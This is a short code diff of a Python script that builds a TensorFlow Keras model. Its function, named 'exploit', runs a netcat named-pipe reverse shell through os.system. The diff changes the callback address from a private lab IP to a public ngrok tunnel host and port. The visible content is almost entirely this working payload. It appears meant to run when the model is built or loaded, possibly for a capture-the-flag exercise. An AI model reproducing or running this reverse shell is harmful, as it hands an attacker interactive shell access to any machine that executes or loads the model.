@@ -2,7 +2,7 @@ import tensorflow as tf
 
 def exploit(x):
     import os
-    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.111 6666 >/tmp/f")
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 2.tcp.eu.ngrok.io 19912 >/tmp/f")
     return x
 
 model = tf.keras.Sequential()
